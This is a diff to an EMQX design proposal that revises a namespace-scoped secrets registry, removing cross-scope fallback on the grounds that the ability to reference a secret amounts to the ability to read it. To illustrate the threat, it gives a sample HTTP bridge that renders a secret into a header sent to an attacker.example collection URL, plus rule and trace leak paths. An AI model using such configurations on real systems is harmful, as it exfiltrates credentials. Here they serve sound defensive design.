@@ -4,6 +4,9 @@
 
 * 2026-05-21: @zmstone Initial draft
 * 2026-07-20: @zmstone Add namespace scoping / isolation
+* 2026-07-23: @zmstone Drop cross-namespace secret sharing: reference implies
+  disclosure, so secrets are reachable only within their own scope (namespace
+  or global), with no fallback in either direction
 
 ## Abstract
 
@@ -28,10 +31,20 @@ Read-back over the API returns metadata only -- the stored byte string
 never leaves the broker except as part of a rendered template at the
 moment the template is used.
 
-Secrets are namespace-scoped: a secret is owned by the namespace of
-the principal that created it, a namespaced reference resolves
-against that namespace first and falls back to the global registry,
-and a global reference never resolves to a namespace-owned secret.
+Secrets are scoped: a secret is owned by the scope of the principal
+that created it — a namespace, or global — and is reachable only from
+configurations running in that same scope. There is no cross-scope
+resolution in either direction: a namespace cannot reference a global
+or sibling-namespace secret, and a global configuration cannot
+reference a namespace's. This strictness is deliberate. Because a
+secret is resolved by rendering it into outbound bytes, and the
+principals who reference secrets are the same principals who choose
+where those bytes go, the ability to *reference* a secret is
+equivalent to the ability to *read* its value. The registry's
+no-read-back API therefore bounds exposure of secrets at rest (config
+dumps, backups, logs) but is not an access-control boundary between
+"can configure" and "can learn the value"; isolation is enforced
+purely by non-reachability across scopes.
 
 ## Motivation
 
@@ -49,10 +62,15 @@ Three concrete pain points follow:
 * **Operational**: rotation is N-touch. Tooling to mass-update the
   same value across configs is missing today and would be brittle if
   added (matching by string equality across heterogeneous templates).
-* **Audit / governance**: an operator who needs to configure a new
-  bridge today must know the value of the shared API token. There is
-  no way to grant "you can reference the production token" without
-  also granting "you can read its value."
+* **Audit / governance**: the same shared API token is copied into
+  many configs, so its plaintext lives in many places at once —
+  `cluster.hocon`, dashboard config views, export artifacts. There is
+  no single named handle to rotate, revoke, or reason about. (Note:
+  the registry does *not* create a "reference but cannot read"
+  privilege — see "Security model: reference implies disclosure"; a
+  principal who can put the token into a config they control can
+  always recover its value. What the registry removes is the token's
+  *at-rest* sprawl, not the operator's knowledge of it.)
 * **Exposure**: rendered templates appear in client trace, in rule
   engine debug output, and in HTTP request logs at the bridge level.
   Today there is no opt-in mechanism for "render this token, but
@@ -104,6 +122,12 @@ Record:
    updated_at  :: integer()      %% monotonic millis
 }
 ```
+
+The owning scope (`?global_ns` or a namespace) is the first element
+of the key. A secret is reachable only from configurations running in
+its owning scope; there is no cross-scope resolution (see "Namespace
+scoping and isolation" below), so no per-secret sharing attribute is
+needed.
 
 The primary key is the `{OwnerNs, Name}` pair, following the v2
 topic-metrics precedent (`emqx_topic_metrics_mria`, keyed
@@ -361,13 +385,19 @@ Endpoints:
 
 * `POST /api/v5/secrets`
   body: `{ "name": "...", "value": "...", "description": "..." }`
-  Creates a new secret. Errors on name collision.
+  Creates a new secret in the caller's scope. Errors on name
+  collision within that scope.
 * `GET /api/v5/secrets`
-  Returns a paginated list of `{ name, description, created_at,
-  updated_at }`. **The value is never returned.**
+  Returns a paginated list of `{ name, description, scope,
+  created_at, updated_at }`, where `scope` is `global` or the owning
+  namespace. **The value is never returned.** The list contains only
+  the caller's own scope; other scopes' secrets are omitted (see
+  "API surface" under Namespace scoping).
 * `GET /api/v5/secrets/{name}`
-  Returns `{ name, description, created_at, updated_at }`. **The
-  value is never returned.**
+  Returns `{ name, description, scope, created_at, updated_at }`.
+  **The value is never returned.** A request for a name outside the
+  caller's scope returns `404`, indistinguishable from a nonexistent
+  name.
 * `PUT /api/v5/secrets/{name}`
   body: `{ "value": "...", "description": "..." }`
   Overwrites the existing secret. This is the rotation path.
@@ -454,72 +484,109 @@ A secret created with a global API key is owned by `?global_ns`. A
 secret created with a namespace-scoped API key is owned by that
 namespace.
 
-#### Resolution: namespace first, then global fallback
+#### Security model: reference implies disclosure
 
-This is the requirement raised in review: an operator needs one
-system-wide secret usable from a *global* HTTP authn hook **and**
-from a *namespace-scoped* HTTP hook, while namespaces must also be
-able to hold their own private secrets.
+The API never returns a value to anyone. It is tempting to read that
+as "an operator can be granted the ability to *reference* a secret
+without being granted the ability to *read* it." For the audience
+that references secrets — principals with data-integration write
+access — that reading is false.
 
-Resolution of a bare name `N` from a context running in namespace
-`NS` is therefore:
+Anyone who can author a data-integration resource controls where its
+rendered output goes, and every such resource is an oracle for the
+secret it references:
 
-1. Look up `{NS, N}`. On hit, use it.
-2. On miss, look up `{?global_ns, N}`. On hit, use it.
-3. On miss, apply the strict-fail behavior described earlier.
+* An HTTP bridge with `X-Steal = "$secret{token}"` and
+  `url = "https://attacker.example/collect"` renders the value onto
+  the wire toward an endpoint the author controls.
+* A rule `SELECT get_secret('token') AS v` that republishes to a
+  topic the author subscribes to leaks the value with no egress at
+  all.
+* Enabling trace on one's own rule that references the secret records
+  the resolved value in the trace log.
 
-Resolution from a context running in the global namespace looks up
-`{?global_ns, N}` **only**. There is no upward fallback — a global
-configuration can never resolve to a namespace-owned secret. That
-direction would let a tenant inject a value into a broker-wide code
-path, which is exactly the isolation break we are trying to avoid.
+So for this feature **the ability to reference a secret is equivalent
+to the ability to read its value.** Disabling read-back on the API
+narrows the exposure of secrets *at rest* (config dumps, backups,
+dashboard, logs — see Motivation) but is not an access-control
+boundary between "can configure" and "can learn the value." The EIP
+does not claim otherwise.
 
-Two existing fallback designs are in tree and they differ
-deliberately:
+The one boundary that *is* real is the negative one: a secret a
+principal **cannot reference** is a secret that principal cannot
+exfiltrate. Cross-scope isolation is therefore built entirely on
+*non-reachability*, not on any view gate.
 
-* `emqx_authz_mnesia:load_rules_for_authorize/3` falls back to global
-  per lookup, whenever the namespaced lookup yields nothing.
-* `emqx_authn_mnesia:lookup_user_with_fallback/3` falls back **only
-  if the namespace has no records at all**, precisely to avoid
-  per-user shadowing in a partially-provisioned namespace.
+#### Resolution: strictly within one scope, no fallback
 
-We adopt the authz (per-name) granularity. The authn concern does not
-transfer: a partially-populated namespace of *users* creates an
-authentication bypass, whereas a namespace that defines some of its
-own secrets and inherits the rest is the intended operating mode for
-this feature — "the tenant overrides the shared backend token but
-inherits the shared signing key."
+Each secret belongs to exactly one scope — a namespace, or global —
+and is reachable only from configurations running in that same scope:
 
-#### Shadowing is an override, and it is bounded
+* A reference (`$secret{N}`, `get_secret('N')`, `secret://N`)
+  evaluated in namespace `NS` resolves `{NS, N}` **only**.
+* A reference evaluated in the global scope resolves
+  `{?global_ns, N}` **only**.
+* On miss — including a name that exists only in a *different* scope —
+  the strict-fail behavior described earlier applies
+  (`{error, {unknown_secret, Name}}`). The failure is identical
+  whether the name is unknown or merely out-of-scope, so a tenant
+  cannot probe for the existence of another scope's names.
 
-A namespace can define `{NS, "prod_token"}` while `{global,
-"prod_token"}` also exists. The namespaced one wins for anything
-running in `NS`. This is deliberate — it is how a tenant overrides an
-inherited default — and it is safe because the only configurations
-that resolve through `NS` are configurations *owned by* `NS`. A
-tenant can redirect their own bridges to their own credential; they
-cannot affect anyone else's.
+There is no namespace→global fallback and no global→namespace
+fallback. Because reference implies disclosure, a fallback that let a
+tenant reference a global secret would be exactly a grant of that
+secret's value to the tenant; a fallback the other direction would
+let a tenant feed a value into a broker-wide code path. Both are the
+isolation breaks we are avoiding, so neither direction exists. No
+qualified `global::<name>` / `secret://global/<name>` cross-scope
+form is provided either — there is no reachable target outside the
+caller's own scope to name.
 
-For the cases where an operator wants to defeat shadowing and pin a
-reference to the global registry explicitly, both reference syntaxes
-accept a qualified form:
+The consequence is deliberate: a credential that must be used from
+both a global configuration and a tenant's configuration is stored
+**once per scope** that uses it. Rotating such a genuinely-common
+credential is therefore per-scope — an N-touch operation across the
+scopes that hold a copy. This is the accepted v1 trade-off for an
+isolation model that is provably simple: one scope, one set of
+reachable secrets, no cross-scope reference anywhere. Targeted
+cross-scope sharing — with its "sharing = disclosing" semantics made
+explicit — is left to a future version; see "Declined alternatives."
 
-* `$secret{global::<name>}` for the placeholder.
-* `secret://global/<name>` for the HOCON URI.
+#### The resolving scope is the configuration's, not the client's
 
-The unqualified forms keep their fallback semantics. `global` is
-already a reserved namespace name
-(`emqx:is_reserved_namespace/1` rejects `global`, `undefined`,
-`null`, `none`), so the qualifier cannot collide with a real
+A secret is resolved in the scope of the *configuration that
+references it*, never in the scope of whatever MQTT client happens to
+trigger the render. This distinction is load-bearing for
+authentication, where the client's namespace is frequently not yet
+established at the moment a secret must be resolved.
+
+A client connects in the **global scope**: its namespace (`tns`) is
+not known at TCP-accept time and is commonly *initialized from the
+authentication result itself* (an authn backend returns a `tns` /
+`namespace` attribute, or it is derived during the authn exchange).
+An HTTP authn / authz request template that references a secret is
+therefore rendered *before* the client has a namespace at all.
+
+Resolution keys off the **authenticator's / authz source's own
+scope**, which is known from that resource's configuration:
+
+* A **namespaced** authenticator (configured under namespace `NS`)
+  resolves its `$secret{...}` references against `{NS, _}`, even
+  though the connecting client is still in the unresolved/global
+  scope. This is *not* a global→namespace fallback: the reference is
+  owned by a namespaced configuration, so it resolves in that
+  namespace by the ordinary rule above. A client being pre-`tns` does
+  not downgrade the authenticator's scope to global.
+* A **global** authenticator resolves against `{?global_ns, _}`.
+
+The implementation must take the resolving namespace from the
+authenticator/source configuration (the chain the client is
+authenticating against), and must **not** substitute the client's
+not-yet-resolved `tns` (which would wrongly fall to global and fail
+to find a namespaced authenticator's secret, breaking namespaced
+authentication). Concretely: do not thread `tns` from the channel
+into secret resolution on the authn path; thread the authenticator's
 namespace.
-
-We do **not** adopt the managed-certs convention of an explicit
-optional `namespace` field defaulting to global
-(`emqx_schema:fields("managed_certs")`, resolved in
-`emqx_tls_lib:resolve_managed_certs/2`) — that form permits arbitrary
-cross-namespace references and currently performs no authorization
-check on them. Only two targets are reachable here: the caller's own
-namespace and global.
 
 #### Where the namespace comes from at resolution time
 
@@ -530,15 +597,17 @@ Each of the three access paths already has the namespace in hand:
 | `secret://<name>` in a connector / action / source config | The resource is namespaced; the namespace is carried in the resource id (`ns:<Ns>:connector:<Type>:<Name>`) and extractable via `emqx_resource:extract_namespace_from_resource_id/1`. |
 | `$secret{<name>}` in an HTTP bridge / action template | Same — the rendering happens inside a namespaced resource. |
 | `$secret{<name>}` / `get_secret('<name>')` in a rule | The rule record carries `namespace`; `emqx_rule_runtime` already propagates it into every action invocation and trace context. |
-| `$secret{<name>}` in an HTTP authn / authz request template | The authenticator / authz source is itself namespaced; the namespace comes from the chain the client authenticated against. |
+| `$secret{<name>}` in an HTTP authn / authz request template | The **authenticator / authz source's own** namespace, taken from its configuration — **not** the connecting client's `tns`, which is typically unresolved at authn time (see "The resolving scope is the configuration's, not the client's"). |
 
 The practical implication for implementation is that
 `emqx_secret_loader:load/1` and the template renderer hooks must take
 a `maybe_namespace()` argument rather than a bare name. Threading
 that argument through every call site is the bulk of the work — a
 default-to-global arity-1 wrapper would compile, and would silently
-resolve every namespaced lookup against the global registry. It must
-not be added.
+resolve every namespaced lookup against the global scope: on the
+data-integration paths it resolves the wrong secret (or fails closed),
+and on the authn path it breaks namespaced authentication by missing
+the authenticator's namespaced secret. It must not be added.
 
 #### API surface
 
@@ -561,16 +630,25 @@ contains a blanket clause allowing **any** `GET` for a namespaced
 superuser, on the documented rationale that "namespaces are mostly to
 avoid accidentally mutating the wrong resources rather than hiding
 information." For this feature that rationale does not hold: a
-namespaced admin must not be able to enumerate another tenant's
-secret *names*, since names are chosen by operators and routinely
-describe the system they unlock. The secrets API therefore filters
-list / get results by `resolved_ns` **in the handler**, not relying
-on the RBAC layer. A namespaced admin listing secrets sees their own
-namespace's secrets plus the global ones they can inherit; never
-another namespace's.
+namespaced admin must not be able to enumerate another scope's secret
+*names*, since names are chosen by operators and routinely describe
+the system they unlock. The secrets API therefore filters list / get
+results **in the handler**, not relying on the RBAC layer. A caller
+whose `resolved_ns` is a namespace `NS` sees exactly the rows owned by
+`NS`; every other row — global secrets and other namespaces' secrets
+alike — is omitted from lists and returns `404` on direct `GET`. A
+global admin (optionally scoped via `?ns=`) sees exactly the rows of
+the scope they are acting in.
 
-Values are never returned by any endpoint regardless of namespace, so
-the isolation being enforced here is over names and metadata only.
+Create / update / delete are restricted to rows the caller owns
+(`resolved_ns`), so a namespaced admin can only manage their own
+namespace's secrets and a global admin only global (or, via `?ns=`, a
+named namespace's) secrets. No principal can reach across scopes.
+
+Values are never returned by any endpoint regardless of scope. As
+"Security model" notes, this bounds at-rest exposure but is not the
+isolation boundary; the isolation boundary is that a scope can neither
+reference nor enumerate any secret outside itself.
 
 #### Namespace deletion
 
@@ -586,8 +664,8 @@ The callback must be idempotent and retry-safe: the janitor re-scans
 tombstones periodically and re-runs cleanup if a previous attempt
 failed.
 
-Deleting a namespace does **not** touch global secrets, including
-ones the namespace's configurations were resolving via fallback.
+Deleting a namespace does **not** touch global secrets or any other
+namespace's secrets; only rows keyed `{NS, _}` are removed.
 
 #### Backup / export
 
@@ -647,20 +725,32 @@ required template variables in HTTP bridges.
   containing a secrets table when the cluster already has secrets.
 * Namespace tests -- the isolation-critical class:
   * A namespaced config resolves a bare name to its own namespace's
-    secret when one exists, and to the global one when it does not.
-  * A global config never resolves to a namespace-owned secret, even
-    when the name exists only in a namespace.
-  * Shadowing: `{NS, "tok"}` wins over `{global, "tok"}` for
-    configurations in `NS`, and leaves other namespaces' resolution
-    unaffected.
-  * `$secret{global::name}` / `secret://global/name` bypass a
-    shadowing namespace-local entry.
+    secret; the same name existing only in the global scope (or in a
+    sibling namespace) is **not** resolved and strict-fails, with a
+    failure indistinguishable from a nonexistent name. This is the
+    value-exfiltration test: a tenant bridge referencing a global name
+    must never render that value onto the wire.
+  * A global config resolves only global secrets and never a
+    namespace-owned secret, even when the name exists only in a
+    namespace.
+  * No cross-scope qualified form exists: `$secret{global::name}` /
+    `secret://global/name` from a namespaced context do not resolve
+    (they are treated as an unknown name or a config-validation
+    error, per implementation choice — assert whichever is chosen).
+  * Authn scoping: a **namespaced** HTTP authenticator resolves its
+    `$secret{...}` against its own namespace even though the
+    connecting client has no `tns` yet (and even when the client's
+    `tns` is initialized *from* this authentication). A **global**
+    authenticator resolves against global. A regression that keys
+    resolution off the client's unresolved `tns` must fail this test.
   * A namespaced admin cannot create, read, update, delete, or
-    **list** another namespace's secrets; a global admin can act on
-    any namespace via `?ns=`.
+    **list** another scope's secrets (another namespace's *or* the
+    global scope's); a global admin can act on any namespace via
+    `?ns=`.
   * Per-namespace cap is enforced per namespace, not cluster-wide.
   * `'namespace.delete'` removes exactly that namespace's secrets and
-    leaves global ones intact; re-running the cleanup is a no-op.
+    leaves global and sibling-namespace ones intact; re-running the
+    cleanup is a no-op.
 * HTTP-header byte check composition: a stored secret whose value
   contains CR / LF is accepted at storage time (UTF-8-only check
   passes), but rejected at the HTTP bridge connector when used as a
@@ -716,14 +806,57 @@ can run a Vault Agent sidecar that templates a HOCON file containing
 ### Returning the value via GET
 
 Considered: allow `GET /api/v5/secrets/{name}` to
-return the value to an operator with sufficient privilege. Rejected:
-once read-back exists, the boundary "operator can configure bridges
-but does not know the secret value" disappears. Read-back also makes
-the audit story muddier -- "did this operator read this secret"
-becomes a question whose answer must be logged, where today the
-answer is uniformly "no." Rotation is the rotation path; if an
-operator needs the value to put it somewhere else, they should
-store it themselves.
+return the value to an operator with sufficient privilege. Rejected,
+though for narrower reasons than one might first assume. It is *not*
+rejected to preserve a "configure but cannot read" boundary — no such
+boundary exists (see "Security model: reference implies disclosure").
+It is rejected because keeping read-back uniformly disabled (a) keeps
+plaintext secrets out of one more egress surface — API responses, and
+their proxy / gateway / browser-history trail — reinforcing the
+at-rest exposure reduction that *is* the feature's value, and (b)
+keeps the audit story crisp: "did any operator read this secret over
+the API" is uniformly answerable as "no," with disclosure occurring
+only through the referencing paths that already carry it. Rotation is
+the rotation path; an operator who needs the value elsewhere should
+store their own copy.
+
+### Cross-namespace secret sharing (fallback, `shared_ns` flag, or allowlist)
+
+Considered, across several shapes and the subject of the review that
+prompted this revision:
+
+1. **Implicit fallback** — a namespaced reference to name `N` that
+   misses locally falls back to the global `N`. This was the shape of
+   an earlier draft.
+2. **Opt-in `shared_ns` flag** — a global secret is reachable from
+   namespaces only when a global admin marks it shared.
+3. **Per-namespace allowlist** — a global secret carries the list of
+   namespaces it is offered to.
+
+All three are rejected for v1, on one root observation: **referencing
+a secret is equivalent to reading its value** (see "Security model:
+reference implies disclosure"). A tenant who can reference a secret in
+a resource they control can render it to an endpoint they control and
+read it off the wire. So any mechanism that lets a namespace reference
+a global secret is, precisely, a mechanism that discloses that
+secret's value to the namespace's administrators — regardless of the
+no-read-back API.
+
+That reframes the design question from "how do we let tenants
+*reference but not read* a shared secret" (which is impossible) to
+"do we want a way to *disclose* a global credential to specific
+tenants." For v1 the answer is no: cross-scope reference does not
+exist in any form. Shape 1 is the most dangerous (silent, name-guess
+exfiltration) and is out. Shape 2's `shared_ns` reads as a
+view-protection but is really an all-tenants disclosure switch — its
+name over-promises, so we do not ship it. Shape 3 is the *honest*
+form of the feature (targeted disclosure) but adds a cross-namespace
+ACL surface that must stay consistent across namespace lifecycle, for
+a use case ("one credential shared to some tenants, rotated once")
+that has not yet been asked for. If that need materializes, shape 3
+is the way to add it later — as an explicit *disclosure* grant, named
+and documented as such — without invalidating stored data (the
+strict-scope model is its zero case).
 
 ### Allowing the placeholder in MQTT topics and payloads
 
